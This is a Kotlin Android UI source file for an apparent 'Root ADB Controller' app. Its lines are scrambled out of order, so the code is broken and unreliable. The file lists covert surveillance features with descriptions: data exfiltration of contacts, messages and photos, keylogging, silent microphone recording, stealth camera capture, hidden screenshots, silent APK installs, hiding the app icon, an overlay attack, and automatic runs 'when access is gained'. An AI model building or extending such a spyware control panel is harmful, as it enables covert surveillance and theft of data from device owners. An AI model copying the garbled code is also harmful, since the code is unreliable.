package com.anti.rootadbcontroller.ui

import androidx.compose.foundation.BorderStroke
    onAutomationSettingsClick: () -> Unit
                .padding(horizontal = 8.dp)
                    // Tap hint text
@Composable
            "Extracts sensitive data like contacts, messages, and photos.",
        ),
            context.getString(R.string.set_clipboard),
        title = { Text("Automation Settings") },
}
import androidx.compose.animation.core.tween
    onShizukuPermissionRequest: () -> Unit,
            modifier = Modifier


            context.getString(R.string.data_exfiltration),
            context.getString(R.string.location_tracker_explanation)
            Constants.FEATURE_SET_CLIPBOARD,
        onDismissRequest = onDismissRequest,
    }
import androidx.compose.animation.core.rememberInfiniteTransition
    onFeatureClick: (Int) -> Unit,
            style = MaterialTheme.typography.caption,
                    Text(text = feature.description, style = MaterialTheme.typography.body2, color = Color.Gray)
}
            Constants.FEATURE_DATA_EXFILTRATION,
            0,
        FeatureItem(
    AlertDialog(
        )
import androidx.compose.animation.core.infiniteRepeatable
    isShizukuAvailable: Boolean,
            color = shizukuColor,
                    Spacer(modifier = Modifier.height(4.dp))
    }
        FeatureItem(
            "Fetches the device's last known GPS location.",
        ),

            onAutomationSettingsClick = {}
import androidx.compose.animation.core.animateFloat
    isRootAvailable: Boolean,
            text = shizukuStatusText,
                    Text(text = feature.title, style = MaterialTheme.typography.h6, fontWeight = FontWeight.Bold)
        )
        ),
            context.getString(R.string.location_tracker),
            context.getString(R.string.get_clipboard_explanation)
    }
            onShizukuPermissionRequest = {},
import androidx.compose.animation.core.RepeatMode
fun MainScreen(
        Text(
                Column(modifier = Modifier.weight(1f)) {
            onDismiss = { showExplanationDialog = false }
            context.getString(R.string.keylogging_explanation)
            Constants.FEATURE_LOCATION_TRACKER,
            0,
        }
            onFeatureClick = {},
import android.content.res.Configuration
@Composable
        val shizukuColor = if (isShizukuAvailable) Color.Green else Color.Red
                Spacer(modifier = Modifier.width(16.dp))
            feature = feature,
            0,
        FeatureItem(
            "Gets the current clipboard content.",
            }
            isShizukuAvailable = true,
import android.content.Context

        val shizukuStatusText = if (isShizukuAvailable) "Shizuku Ready" else "Shizuku Not Ready"
                // Icon(painterResource(id = feature.iconResId), contentDescription = null)
        FeatureExplanationDialog(
            "Monitors and logs all text input.",
        ),
            context.getString(R.string.get_clipboard),
                this[key] = AutomationUtils.getAutomation(context, key)
            isRootAvailable = true,
import com.anti.rootadbcontroller.utils.Constants

                // In a real app, you'd use feature.iconResId here
    if (showExplanationDialog) {
            context.getString(R.string.keylogging),
            context.getString(R.string.mic_recorder_explanation)
            Constants.FEATURE_GET_CLIPBOARD,
            automationKeys.forEach { key ->
        MainScreen(
import com.anti.rootadbcontroller.utils.AutomationUtils
        )
            ) {
    // Explanation dialog
            Constants.FEATURE_KEYLOGGING,
            0,
        FeatureItem(
        mutableStateMapOf<String, Boolean>().apply {
    RootADBControllerTheme {
import com.anti.rootadbcontroller.ui.theme.RootADBControllerTheme
            modifier = Modifier.padding(horizontal = 8.dp)
                verticalAlignment = Alignment.CenterVertically

        FeatureItem(
            "Silently records audio from the microphone.",
        ),
    val automationStates = remember {
fun DefaultPreview() {
import com.anti.rootadbcontroller.models.FeatureItem
            style = MaterialTheme.typography.caption,
                    .padding(16.dp),
    }
    return listOf(
            context.getString(R.string.mic_recorder),
            context.getString(R.string.stealth_camera_explanation)
    val automationKeys = remember { AutomationUtils.getAllAutomationKeys() }
@Composable
import com.anti.rootadbcontroller.R
            color = rootColor,
                    )
        }
fun getFeatureList(context: Context): List<FeatureItem> {
            Constants.FEATURE_MIC_RECORDER,
            0,
) {
@Preview(showBackground = true, uiMode = Configuration.UI_MODE_NIGHT_YES)
import androidx.compose.ui.unit.dp
            text = rootStatusText,
                        onClick = onClick
            }

        FeatureItem(
            "Silently takes a picture from the front camera.",
    onDismissRequest: () -> Unit

import androidx.compose.ui.tooling.preview.Preview
        Text(
                        indication = null,
                }
}
        ),
            context.getString(R.string.stealth_camera),
    context: Context,
}
import androidx.compose.ui.text.font.FontWeight
        val rootColor = if (isRootAvailable) Color.Green else Color.Red
                        interactionSource = interactionSource,
                    }
    )
            context.getString(R.string.log_access_explanation)
            Constants.FEATURE_STEALTH_CAMERA,
fun AutomationSettingsDialog(
    )
import androidx.compose.ui.platform.LocalContext
        val rootStatusText = if (isRootAvailable) "Rooted" else "Not Rooted"
                    .clickable(
                        )
        shape = RoundedCornerShape(16.dp)
            0,
        FeatureItem(
@Composable
        }
import androidx.compose.ui.graphics.Color
    Row(verticalAlignment = Alignment.CenterVertically) {
                    .fillMaxWidth()
                                )
        backgroundColor = MaterialTheme.colors.surface,
            "Accesses and displays system-level logs (logcat).",
        ),

            }
import androidx.compose.ui.draw.scale
fun RootStatusIndicator(isRootAvailable: Boolean, isShizukuAvailable: Boolean, onShizukuPermissionRequest: () -> Unit) {
                modifier = Modifier
                                    shape = CircleShape
        },
            context.getString(R.string.log_access),
            context.getString(R.string.camera_mic_detector_explanation)
}
                Text("Close")
import androidx.compose.ui.Modifier
@Composable
            Row(
                                    color = MaterialTheme.colors.primary.copy(alpha = 0.2f),
            }
            Constants.FEATURE_LOG_ACCESS,
            0,
    )
            ) {
import androidx.compose.ui.Alignment

        Column {
                                .background(
                Text("Close", color = Color.White)
        FeatureItem(
            "Detects if the camera or microphone is currently being used by any app.",
        )
                onClick = onDismissRequest
import androidx.compose.runtime.setValue
}
    ) {
                                .scale(scale)
            ) {
        ),
            context.getString(R.string.camera_mic_detector),
            context.getString(R.string.automation_settings_explanation)
            Button(
import androidx.compose.runtime.remember
    }
        )
                                .align(Alignment.Center)
                colors = ButtonDefaults.buttonColors(backgroundColor = MaterialTheme.colors.primary)
            context.getString(R.string.screenshot_explanation)
            Constants.FEATURE_CAMERA_MIC_DETECTOR,
            0,
        confirmButton = {
import androidx.compose.runtime.mutableStateOf
        }
            color = if (isHovered) MaterialTheme.colors.primary.copy(alpha = 0.5f) else Color.Transparent
                                .size(24.dp)
                onClick = onDismiss,
            0,
        FeatureItem(
            "Configure automatic tasks.",
        },
import androidx.compose.runtime.mutableStateMapOf
            )
            width = 1.dp,
                            modifier = Modifier
            Button(
            "Takes a screenshot of the current screen without any visual indication.",
        ),
            "Automation Settings",
            }
import androidx.compose.runtime.getValue
                onDismissRequest = { showAutomationDialog = false }
        border = BorderStroke(
                        Box(
        confirmButton = {
            context.getString(R.string.screenshot),
            context.getString(R.string.hidden_app_finder_explanation)
            Constants.FEATURE_AUTOMATION_SETTINGS,
                }
import androidx.compose.runtime.Composable
                context = context,
        elevation = if (isHovered) 8.dp else 4.dp,

        },
            Constants.FEATURE_SCREENSHOT,
            0,
        FeatureItem(
                    }
import androidx.compose.material.icons.filled.MoreVert
            AutomationSettingsDialog(
        },
                        )
            }
        FeatureItem(
            "Finds installed apps that do not have a launcher icon.",
        ),
                        Divider(modifier = Modifier.padding(vertical = 4.dp))
import androidx.compose.material.icons.filled.Info
        if (showAutomationDialog) {
            MaterialTheme.colors.surface
                            )
                }
        ),
            context.getString(R.string.hidden_app_finder),
            context.getString(R.string.remote_adb_explanation)
                    if (key != automationKeys.last()) {
import androidx.compose.material.icons.Icons
        // Automation Settings Dialog
        } else {
                                repeatMode = RepeatMode.Reverse
                    )
            context.getString(R.string.system_control_explanation)
            Constants.FEATURE_HIDDEN_APP_FINDER,
            0,

import androidx.compose.material.TopAppBar

            )
                                animation = tween(1000),
                        modifier = Modifier.padding(bottom = 8.dp)
            0,
        FeatureItem(
            "Controls ADB over the network.",
                    }
import androidx.compose.material.Text
        )
                alpha = 0.9f
                            animationSpec = infiniteRepeatable(
                        style = MaterialTheme.typography.body1,
            "Control system functions like rebooting or toggling hardware.",
        ),
            context.getString(R.string.remote_adb),
                        )
import androidx.compose.material.Switch
            modifier = Modifier.padding(padding)
            MaterialTheme.colors.surface.copy(
                            targetValue = 1.2f,
                        text = feature.detailedExplanation,
            context.getString(R.string.system_control),
            context.getString(R.string.overlay_detector_explanation)
            Constants.FEATURE_REMOTE_ADB,
                            }
import androidx.compose.material.Scaffold
            onFeatureClick = onFeatureClick,
        backgroundColor = if (isHovered) {
                            initialValue = 1f,
                    Text(
            Constants.FEATURE_SYSTEM_CONTROL,
            0,
        FeatureItem(
                                AutomationUtils.setAutomation(context, key, isChecked)
import androidx.compose.material.MaterialTheme
            features = getFeatureList(context),
        shape = MaterialTheme.shapes.large,
                        val scale by infiniteTransition.animateFloat(
                item {
        FeatureItem(
            "Lists all apps that have permission to draw over other applications.",
        ),
                                automationStates[key] = isChecked
import androidx.compose.material.IconButton
        FeatureList(
            .padding(horizontal = 16.dp, vertical = 8.dp),
                        val infiniteTransition = rememberInfiniteTransition()
            ) {
        ),
            context.getString(R.string.overlay_detector),
            context.getString(R.string.system_properties_explanation)
                            onCheckedChange = { isChecked ->
import androidx.compose.material.Icon
    ) { padding ->
            .fillMaxWidth()
                    if (!showExplanationDialog) {
                    .fillMaxWidth()
            context.getString(R.string.file_access_explanation)
            Constants.FEATURE_OVERLAY_DETECTOR,
            0,
                            checked = automationStates[key] ?: false,
import androidx.compose.material.Divider
        }
        modifier = Modifier
                    // Pulsating effect for the info button
                    .padding(top = 8.dp)
            0,
        FeatureItem(
            "Views system properties and device information.",
                        Switch(
import androidx.compose.material.Card
            )
    Card(

                modifier = Modifier
            "Browse and view files in protected system directories.",
        ),
            context.getString(R.string.system_properties),
                        )
import androidx.compose.material.ButtonDefaults
                }

                    }
            LazyColumn(
            context.getString(R.string.file_access),
            context.getString(R.string.permissions_scanner_explanation)
            Constants.FEATURE_SYSTEM_PROPERTIES,
                            modifier = Modifier.weight(1f)
import androidx.compose.material.Button
                    }
    val isHovered by interactionSource.collectIsHoveredAsState()
                        )
            // Use LazyColumn for scrollable content
            Constants.FEATURE_FILE_ACCESS,
            0,
        FeatureItem(
                            style = MaterialTheme.typography.body1,
import androidx.compose.material.AlertDialog
                        )
    val interactionSource = remember { MutableInteractionSource() }
                            tint = MaterialTheme.colors.primary
        text = {
        FeatureItem(
            "Scans all installed apps and lists those with potentially dangerous permissions.",
        ),
                            text = displayName,
import androidx.compose.foundation.shape.RoundedCornerShape
                            contentDescription = "Automation Settings"
    var showExplanationDialog by remember { mutableStateOf(false) }
                            contentDescription = "More information",
        },
        ),
            context.getString(R.string.permissions_scanner),
            context.getString(R.string.package_manager_explanation)
                        Text(
import androidx.compose.foundation.shape.CircleShape
                            imageVector = Icons.Default.MoreVert,
fun FeatureCard(feature: FeatureItem, onClick: () -> Unit) {
                            imageVector = Icons.Default.Info,
            }
            context.getString(R.string.network_monitor_explanation)
            Constants.FEATURE_PERMISSIONS_SCANNER,
            0,
                    ) {
import androidx.compose.foundation.lazy.items
                        Icon(
@Composable
                        Icon(
                )
            0,
        FeatureItem(
            "Manages installed packages using Shizuku.",
                        verticalAlignment = Alignment.CenterVertically
import androidx.compose.foundation.lazy.LazyColumn
                    IconButton(onClick = onAutomationSettingsClick) {

                    ) {
                    modifier = Modifier.padding(top = 8.dp)
            "Displays all active network connections on the device.",
        ),
            context.getString(R.string.package_manager),
                            .padding(vertical = 8.dp),
import androidx.compose.foundation.layout.width
                    // Add automation settings button
}
                        modifier = Modifier.padding(start = 8.dp)
                    thickness = 1.dp,
            context.getString(R.string.network_monitor),
            context.getString(R.string.hide_app_icon_explanation)
            Constants.FEATURE_PACKAGE_MANAGER,
                            .fillMaxWidth()
import androidx.compose.foundation.layout.size

    }
                        onClick = { showExplanationDialog = true },
                    color = MaterialTheme.colors.primary.copy(alpha = 0.3f),
            Constants.FEATURE_NETWORK_MONITOR,
            0,
        FeatureItem(
                        modifier = Modifier
import androidx.compose.foundation.layout.padding
                    RootStatusIndicator(isRootAvailable, isShizukuAvailable, onShizukuPermissionRequest)
        }
                    IconButton(
                Divider(
        FeatureItem(
            "Hides the app icon from the launcher.",
        ),
                    Row(
import androidx.compose.foundation.layout.height
                actions = {
            FeatureCard(feature = feature, onClick = { onFeatureClick(feature.id) })
                Box {
                )
        ),
            context.getString(R.string.hide_app_icon),
            context.getString(R.string.shizuku_operations_explanation)
                    val displayName = AutomationUtils.getKeyDisplayName(key)
import androidx.compose.foundation.layout.fillMaxWidth
                backgroundColor = MaterialTheme.colors.surface,
        items(features) { feature ->
                // Info button with tooltip hint
                    style = MaterialTheme.typography.h6
            context.getString(R.string.silent_install_explanation)
            Constants.FEATURE_HIDE_APP_ICON,
            0,
                automationKeys.forEach { key ->
import androidx.compose.foundation.layout.Spacer
                title = { Text("Root ADB Controller") },
    LazyColumn(modifier = modifier.background(MaterialTheme.colors.background)) {

                    fontWeight = FontWeight.Bold,
            0,
        FeatureItem(
            "Performs operations using Shizuku.",

import androidx.compose.foundation.layout.Row
            TopAppBar(
fun FeatureList(features: List<FeatureItem>, onFeatureClick: (Int) -> Unit, modifier: Modifier = Modifier) {
                }
                    text = feature.title,
            "Installs APKs in the background without user interaction.",
        ),
            context.getString(R.string.shizuku_operations),
                )
import androidx.compose.foundation.layout.Column
        topBar = {
@Composable
                    )
                Text(
            context.getString(R.string.silent_install),
            context.getString(R.string.overlay_attack_explanation)
            Constants.FEATURE_SHIZUKU_OPERATIONS,
                    modifier = Modifier.padding(bottom = 16.dp)
import androidx.compose.foundation.layout.Box
    Scaffold(

                        modifier = Modifier.padding(top = 4.dp)
            Column {
            Constants.FEATURE_SILENT_INSTALL,
            0,
        FeatureItem(
                    style = MaterialTheme.typography.body1,
import androidx.compose.foundation.interaction.collectIsHoveredAsState

}
                        color = MaterialTheme.colors.primary.copy(alpha = 0.7f),
        title = {
        FeatureItem(
            "Demonstrates a UI overlay by drawing a window over other apps.",
        ),
                    text = "Select which features to automatically run when access is gained:",
import androidx.compose.foundation.interaction.MutableInteractionSource
    var showAutomationDialog by remember { mutableStateOf(false) }
    }
                        style = MaterialTheme.typography.caption,
        onDismissRequest = onDismiss,
        ),
            context.getString(R.string.overlay_attack),
            context.getString(R.string.set_clipboard_explanation)
                Text(
import androidx.compose.foundation.clickable
    val context = LocalContext.current
        )
                        text = "Tap to activate",
    AlertDialog(
            context.getString(R.string.data_exfiltration_explanation)
            Constants.FEATURE_OVERLAY_ATTACK,
            0,
            Column {
import androidx.compose.foundation.background
) {
                .clickable(onClick = onShizukuPermissionRequest)
                    Text(
fun FeatureExplanationDialog(feature: FeatureItem, onDismiss: () -> Unit) {
            0,
        FeatureItem(
            "Sets the clipboard content.",
        text = {
